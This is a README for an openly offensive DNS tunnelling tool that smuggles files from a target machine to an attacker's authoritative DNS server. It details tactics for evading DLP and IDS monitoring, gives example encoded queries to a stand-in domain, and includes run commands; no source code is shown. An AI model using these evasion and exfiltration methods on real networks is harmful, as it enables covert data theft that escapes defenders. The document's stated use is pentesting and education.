# DNS_scapy - Stealth DNS Exfiltration Tool

A covert file transfer tool that tunnels data through DNS queries, designed to evade enterprise DLP/IDS systems. Built for penetration testing labs and security education.

## Architecture

```
Target Machine (client.py)       Network DNS Resolver        Attacker's Server (dns_server.py)
──────────────────────────       ───────────────────        ────────────────────────────────
1. Encode file data               Recursive resolution       1. Authoritative for domain
2. Build DNS queries           ──> Resolver queries NS  ──> 2. Extract data from subdomains
3. Send via system resolver        Caches & forwards         3. Respond with valid A records
4. Mix with noise queries    <──  Returns response    <──  4. Reassemble & verify file
5. Burst-silence timing           Standard DNS path          5. Save to disk
```

Traffic flows through the network's normal DNS resolver - never direct to the attacker's IP.

## Anti-Detection Features

| Detection Vector | How We Evade |
|-----------------|-------------|
| **NXDOMAIN** | `dns_server.py` returns valid A records with CDN-range IPs (Cloudflare) |
| **Entropy** | Hex-split: ~3.3 bits/char, Wordlist: ~2.0 bits/char (normal DNS is ~2.5) |
| **Label length** | 8-14 chars (hex-split) or 3-6 chars (wordlist) — within normal range |
| **Volume** | Spread over hours with burst-silence pattern, mixed with noise queries |
| **Unique ratio** | ~75% unique (15% duplicate injection), vs 100% in naive tunneling |
| **Timing** | Burst-silence mimics browser: 3-8 queries in 50-500ms, then 2-15s pause |
| **Record types** | 70% A, 25% AAAA, 5% CNAME — matches real browsing distribution |
| **Sequence pattern** | Obfuscated sequence numbers defeat Cisco Umbrella "sequence gluing" |

## Encoding Strategies

### Hex-Split (default)
Data hex-encoded, split across short labels with CDN-like prefixes:
```
img3f2a1b.cdn7e9d04.s2c8a1.ab1f.0a3c.analytics-cdn.example.com
```

### Wordlist
Each byte mapped to a common English word (256-word dictionary):
```
book.rain.soft.tree.ab1f.0a3c.analytics-cdn.example.com
```

## Setup

### Prerequisites
- Python 3.6+
- A domain you control with NS records pointing to your server
- Root/sudo on the server machine

### Installation

```bash
pip install -r requirements.txt
```

### Domain Setup
1. Register/use a domain (e.g., `analytics-cdn.example.com`)
2. Create NS record pointing to your server's IP
3. Update `BASE_DOMAIN` in `config.py`

## Usage

### 1. Start the server (attacker machine)

```bash
sudo python3 dns_server.py
```

### 2. Run the client (target machine)

```bash
python3 client.py
# Enter file path to exfiltrate: /path/to/secret.pdf
```

The client uses the system's DNS resolver — no raw packet privileges needed.

## Configuration

Edit `config.py`:

| Setting | Default | Description |
|---------|---------|-------------|
| `BASE_DOMAIN` | analytics-cdn.example.com | Your controlled domain |
| `ENCODING_STRATEGY` | hex_split | `hex_split` or `wordlist` |
| `NOISE_RATIO` | 3 | Noise queries per data query |
| `BURST_SIZE_MIN/MAX` | 3 / 8 | Queries per burst |
| `INTER_BURST_DELAY` | 2.0 - 15.0s | Pause between bursts |
| `DUPLICATE_QUERY_RATE` | 0.15 | Rate of duplicate injection |
| `QUERY_TYPE_WEIGHTS` | A:70 AAAA:25 CNAME:5 | Record type distribution |
| `SEQUENCE_SEED` | 0xDEADBEEF | Shared secret for sequence obfuscation |

## Project Structure

```
DNS_scapy/
├── client.py           # Exfiltration sender (runs on target)
├── dns_server.py       # Authoritative DNS receiver (runs on attacker)
├── encoding.py         # Shared encoding module (hex-split + wordlist)
├── config.py           # Shared configuration
├── noise_domains.txt   # Popular domains for noise queries
├── requirements.txt
├── .gitignore
└── README.md
```

## Disclaimer

For authorized penetration testing, CTF competitions, and security education in controlled lab environments only.
